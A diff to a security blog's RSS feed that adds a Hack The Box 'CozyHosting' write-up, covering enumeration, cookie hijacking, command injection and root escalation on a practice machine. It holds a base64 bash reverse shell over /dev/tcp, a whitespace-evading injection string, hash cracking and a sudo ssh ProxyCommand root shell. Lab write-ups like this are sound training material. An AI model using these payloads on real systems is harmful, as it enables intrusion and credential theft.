@@ -6,8 +6,161 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Sat, 24 Feb 2024 19:37:32 -0600</lastBuildDate>
+        <lastBuildDate>Sat, 02 Mar 2024 11:10:54 -0600</lastBuildDate>
         <atom:link href="https://scorpiosec.com/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>HTB: CozyHosting</title>
+            <link>https://scorpiosec.com/posts/2024/03/htb-cozyhosting/</link>
+            <pubDate>Sat, 02 Mar 2024 11:10:54 -0600</pubDate>
+            
+            <guid>https://scorpiosec.com/posts/2024/03/htb-cozyhosting/</guid>
+            <description>Platform: Hack The Box Link: CozyHosting Level: Easy OS: Linux CozyHosting is an easy Linux machine featuring a Hosting website vulnerable to command injection.
+The target IP address is 10.10.11.230
+Scanning sudo nmap -sC -sV -oA nmap/CozyHosting 10.10.11.230 We have a Linux machine Running a web application on port 80 The SSH service is enabled on the target Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-26 11:21 CST Nmap scan report for cozyhosting.</description>
+            <content type="html"><![CDATA[<ul>
+<li>Platform: Hack The Box</li>
+<li>Link: <a href="https://app.hackthebox.com/machines/CozyHosting" target="_blank" >CozyHosting</a>
+
+</li>
+<li>Level: Easy</li>
+<li>OS: Linux</li>
+</ul>
+<hr>
+<p>CozyHosting is an easy Linux machine featuring a Hosting website vulnerable to command injection.</p>
+<p>The target IP address is <code>10.10.11.230</code></p>
+<h2 id="scanning">Scanning</h2>
+<pre tabindex="0"><code>sudo nmap -sC -sV -oA nmap/CozyHosting 10.10.11.230
+</code></pre><ul>
+<li>We have a Linux machine</li>
+<li>Running a web application on port 80</li>
+<li>The SSH service is enabled on the target</li>
+</ul>
+<pre tabindex="0"><code>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-26 11:21 CST
+Nmap scan report for cozyhosting.htb (10.10.11.230)
+Host is up (0.046s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
+|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Cozy Hosting - Home
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.53 seconds
+</code></pre><p>Let&rsquo;s add the target to our host directory by adding <code>10.10.11.230 cozyhosting.htb</code> to the <code>/etc/hosts</code> file.</p>
+<p>Let&rsquo;s check the application by visiting <code>http://cozyhosting.htb</code>. This is a hosting service, the <code>Home</code>, <code>Services</code>, and <code>Pricing</code> links don&rsquo;t do anything special.</p>
+<p><img src="/images/HTB-CozyHosting/cozyhosting.png" alt="cozyhosting-website"></p>
+<p>The <code>Login</code> button leads you to a login page with url <code>cozyhosting.htb/login</code>.</p>
+<p><img src="/images/HTB-CozyHosting/cozyhosting-login.png" alt="cozyhosting-login-form"></p>
+<p>First we use <code>Gobuster</code> to find any potential hidden directories, I am using <a href="https://github.com/danielmiessler/SecLists" target="_blank" >SecLists</a>
+
+.</p>
+<pre tabindex="0"><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://cozyhosting.htb
+</code></pre><p><img src="/images/HTB-CozyHosting/gobuster-medium.png" alt="cozyhosting-Gobuster"></p>
+<p><code>/admin</code> and <code>/logout</code> sends you to the login page. With <code>/error</code> you get to a page with this message.</p>
+<p><img src="/images/HTB-CozyHosting/whitelabel-error.png" alt="cozyhosting-error-page"></p>
+<p>I don&rsquo;t know what this error means so I google it and I learn that it is a Spring Boot error. Reading more about it I discover that it indicates that the Spring Boot application does not have a specific endpoint or route defined for handling the <code>/error</code> path and that they might be more endpoints in the application.</p>
+<blockquote>
+<p>Check this stackoverflow page <a href="https://stackoverflow.com/questions/31134333/this-application-has-no-explicit-mapping-for-error" target="_blank" >Whitelabel Error Page</a>
+
+</p>
+</blockquote>
+<p>I go back to gobuster for a more specific directory enumeration. SecLists has a list for spring boot that we can use.</p>
+<pre tabindex="0"><code>gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt -u http://cozyhosting.htb
+</code></pre><p><img src="/images/HTB-CozyHosting/gobuster-springboot.png" alt="cozyhosting-Gobuster-spring-boot"></p>
+<p>We discover more directories, after testing all of them I find what looks like a cookie for the user <code>kanderson</code> in <code>/actuator/sessions</code>.</p>
+<p><img src="/images/HTB-CozyHosting/cookie.png" alt="cozyhosting-cookie"></p>
+<p>I go back to the login page and try to use it. I use some random values for <code>Username</code> and <code>Password</code> to generate a cookie. Then I replace my cookie value with the one I just found and refresh the page.</p>
+<p>I now have access to the Dashboard of the user.</p>
+<p><img src="/images/HTB-CozyHosting/Dashboard.png" alt="cozyhosting-dashboard"></p>
+<p>There is another input field, it seems to be working with some SSH key files.</p>
+<p><img src="/images/HTB-CozyHosting/cozyhosting-SSH-note-1.png" alt="cozyhosting-SSH-note"></p>
+<p>I use Burp Suite to capture the request. I try <code>cozyhosting:test</code> and I get that the <code>host key verification failed</code>. After I submit a <code>hostname</code> and <code>username</code> the form makes a request to the endpoint <code>/executessh</code>.</p>
+<p><img src="/images/HTB-CozyHosting/host-key-verification-fail.png" alt="cozyhosting-host-key-failure"></p>
+<p>I can also see in that the application is trying to execute some bash commands and I get an error created when <code>/bin/bash -c</code> is executed.</p>
+<p><img src="/images/HTB-CozyHosting/binbash-error.png" alt="cozyhosting-bash-error"></p>
+<h2 id="foothold">Foothold</h2>
+<p>Now I know that some bash command is being executed I can try to get a reverse shell through this process.</p>
+<p>I used this command to generate my payload in base64.</p>
+<pre tabindex="0"><code>echo &#34;bash -i &gt;&amp; /dev/tcp/&lt;your-ip&gt;/&lt;your-port&gt; 0&gt;&amp;1&#34; | base64 -w 0
+</code></pre><p><img src="/images/HTB-CozyHosting/payload-generated.png" alt="cozyhosting-payload"></p>
+<p><strong>Setup a netcat listener before attempting to login.</strong></p>
+<pre tabindex="0"><code>nc -nvlp &lt;YOUR-PORT-NUMBER&gt;
+</code></pre><p>I try to login with <code>cozyhosting</code> as the hostname and for the username I use the command below (I am using my base64 payload generated earlier with the <code>echo</code> command).</p>
+<pre tabindex="0"><code>echo &#34;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMjIvODAwMCAwPiYxCg==&#34;
+</code></pre><p>I get a message saying that <code>Username can't contain whitespaces!</code>. I then use the bash parameter <code>{IFS%??}</code> to remove spaces from the payload.</p>
+<pre tabindex="0"><code>;echo${IFS%??}&#34;&lt;your payload here&gt;&#34;${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
+</code></pre><p>After using the new payload I get a reverse shell!</p>
+<p><img src="/images/HTB-CozyHosting/rev-shell.png" alt="cozyhosting-reverse-shell"></p>
+<p>We can make the shell stable with these commands</p>
+<pre tabindex="0"><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;  
+export TERM=xterm  
+ctrl + z  
+stty raw -echo; fg
+</code></pre><p><img src="/images/HTB-CozyHosting/stable-shell.png" alt="cozyhosting-stable-shell"></p>
+<blockquote>
+<p>Do not worry if you cannot see the prompt after running the last command, just press <code>Enter</code> and everything will come back.</p>
+</blockquote>
+<p>We find an archive on the target system, let&rsquo;s download it.</p>
+<p>I set up a server on the target</p>
+<pre tabindex="0"><code>python3 -m http.server 8000
+</code></pre><p>On my attack machine I run</p>
+<pre tabindex="0"><code>wget cozyhosting.htb:8000/cloudhosting-0.0.1.jar
+</code></pre><p>Unzip the archive with</p>
+<pre tabindex="0"><code>unzip cloudhosting-0.0.1.jar
+</code></pre><p>I search through it with <code>grep -r password *</code> and I get some matches. I see that there is a password in <code>BOOT-INF/classes/application.properties</code>.</p>
+<p><img src="/images/HTB-CozyHosting/password-location-springboot.png" alt="cozyhosting-password-in-archive"></p>
+<p>I output the content of the file on the terminal and I get a username on top of the password for a PostgreSQL database.</p>
+<p><img src="/images/HTB-CozyHosting/postgres-credentials.png" alt="cozyhosting-full-credentials"></p>
+<p>We log in PostgreSQL with</p>
+<pre tabindex="0"><code>psql -h 127.0.0.1 -U postgres
+</code></pre><p>Then we connect to the database with</p>
+<pre tabindex="0"><code>\c cozyhosting
+</code></pre><p><img src="/images/HTB-CozyHosting/postgres-loggedin.png" alt="cozyhosting-db-login"></p>
+<p>I then list the tables of the database with <code>\d</code>.</p>
+<p><img src="/images/HTB-CozyHosting/db-tables.png" alt="cozyhosting-db-tables"></p>
+<p>I then run <code>select * from users;</code>, with this command PostgreSQL will retrieve all rows and all columns from the &ldquo;users&rdquo; table and return them as a result set. This query is commonly used to view the contents of a table and can be very useful for inspecting the data stored in the database.</p>
+<p>We find some hashes.</p>
+<p><img src="/images/HTB-CozyHosting/db-hashes.png" alt="cozyhosting-db-hashes"></p>
+<p>Let&rsquo;s what type of hash this is (of course we are interested in the admin hash we are already logged in as kanderson).</p>
+<pre tabindex="0"><code>hashid &#39;$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm&#39; 
+</code></pre><p><img src="/images/HTB-CozyHosting/hashid.png" alt="cozyhosting-hash-ID"></p>
+<h2 id="lateral-movement">Lateral Movement</h2>
+<p>Let&rsquo;s try to crack the hash. First I get it into a file.</p>
+<pre tabindex="0"><code>echo &#39;$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm&#39; &gt; hash.txt
+</code></pre><blockquote>
+<p>If you don&rsquo;t want to use <code>John</code>, use this website <a href="https://hashes.com/en/decrypt/hash" target="_blank" >hashes.com</a>
+
+</p>
+</blockquote>
+<pre tabindex="0"><code>john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+</code></pre><p>I get the password <code>manchesterunited</code>.</p>
+<p>Back on the reverse shell, I run <code>ls -la /home</code> and you I see another directory own by the user <code>josh</code>.</p>
+<p><img src="/images/HTB-CozyHosting/home-listing.png" alt="cozyhosting-home-content"></p>
+<p>I switch to the <code>josh</code> user with <code>su josh</code> with the password we just cracked. I check his home directory with  <code>cd $home</code> and find the flag <code>user.txt</code> there!</p>
+<p><img src="/images/HTB-CozyHosting/userflag.png" alt="cozyhosting-user-flag"></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>I use <code>sudo -l</code> to see what this user can run.</p>
+<p><img src="/images/HTB-CozyHosting/sudo-l-josh.png" alt="cozyhosting-sudo-l"></p>
+<p>I go to <a href="https://gtfobins.github.io/gtfobins/ssh/#sudo" target="_blank" >GTFObins</a>
+
+ to find some ssh root shells commands and I use</p>
+<pre tabindex="0"><code>sudo ssh -o ProxyCommand=&#39;;sh 0&lt;&amp;2 1&gt;&amp;2&#39; x
+</code></pre><p><img src="/images/HTB-CozyHosting/priv-escalation.png" alt="cozyhosting-privilege-escalation"></p>
+<p>The shell is not optimal you can run this command to get a proper one</p>
+<pre tabindex="0"><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
+</code></pre><p>All you need to do now is <code>cd $home</code> and you will find the <code>root.txt</code> flag.</p>
+<p><img src="/images/HTB-CozyHosting/rootflag-1.png" alt="cozyhosting-privilege-escalation"></p>
+<p>Thanks for checking my writeup, feel free to comment or reach out to me on on X <a href="https://twitter.com/_KScorpio" target="_blank" >@_KScorpio</a>
+
+ if you have any questions.</p>
+]]></content>
+        </item>
         
         <item>
             <title>HTB: Visual</title>
